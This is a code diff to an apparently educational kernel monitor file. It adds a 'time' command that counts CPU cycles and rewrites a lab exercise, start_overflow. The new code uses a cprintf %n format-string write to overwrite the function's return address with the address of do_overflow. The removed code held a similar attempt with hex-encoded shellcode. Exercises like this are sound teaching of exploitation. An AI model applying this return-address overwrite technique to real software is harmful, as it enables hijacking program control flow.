@@ -25,6 +25,7 @@ static struct Command commands[] = {
 	{ "help", "Display this list of commands", mon_help },
 	{ "kerninfo", "Display information about the kernel", mon_kerninfo },
 	{	"backtrace", "Backtrace calling stack", mon_backtrace },
+	{ "time", "Display running time of the command", mon_time},
 };
 
 /***** Implementations of basic kernel monitor commands *****/
@@ -88,20 +89,13 @@ start_overflow(void)
     char *pret_addr;
 
 	// Your code here.
-	uint32_t addr = read_pretaddr();
-	memset(str, 0xd, 255);
-	str[255] = '\0';
-	str[0xfc] = '\0';
-	cprintf("%s%n", str, addr + 1);
-	str[0xa0] = '\0';
-	cprintf("%s%n", str, addr);
-	memset(str, '\0', 255);
-	const char *malwarm = 
-	"\x81\xec\x10\x01\x00\x00\xe8\x93\x0b\xff\xff\x81\xc4\x10\x01\x00\x00\xe9\xff\x0c\xff\xff";
-	memcpy(str, malwarm, 24);
-	// strcpy(str , "\xff\x15\x0d\x09\x10\xf0\xff\x25\x2a\x09\x10\xf0");
-	if (str[16] != malwarm[16]) {
-		cprintf("%s", "");
+	pret_addr = (char *)read_pretaddr();
+	uint32_t maladdr = (uint32_t)do_overflow;
+	for (int i = 0; i != 4; i++) {
+		cprintf("%*s%n", pret_addr[i] & 0xff, "\x0d", pret_addr + 4 + i);
+	}
+	for (int i = 0; i != 4; i++) {
+		cprintf("%*s%n", (maladdr >> (i * 8)) & 0xff, "\x0d", pret_addr + i);
 	}
 }
 
@@ -143,7 +137,31 @@ mon_backtrace(int argc, char **argv, struct Trapframe *tf)
 	return 0;
 }
 
+int mon_time(int argc, char **argv, struct Trapframe *tf)
+{
+	if (argc != 2) 
+	return 0;
+	// lookup the command in command table
+	struct Command *cmd = NULL;
+	for (int i = 0; i < ARRAY_SIZE(commands); i++) {
+		if (strcmp(argv[1], commands[i].name) == 0) {
+			cmd = &(commands[i]);
+			break;
+		}
+	}
+	// if command not found
+	// return
+	if (!cmd) return 0;
+	
+	uint64_t begin = 0;
+	begin = read_tsc();
 
+	cmd->func(argc - 1, & argv[1], tf);
+
+	uint64_t stop = read_tsc();
+	cprintf("%s cycles: %lld\n", argv[1], stop-begin);
+	return 0;
+}
 
 /***** Kernel monitor command interpreter *****/
 
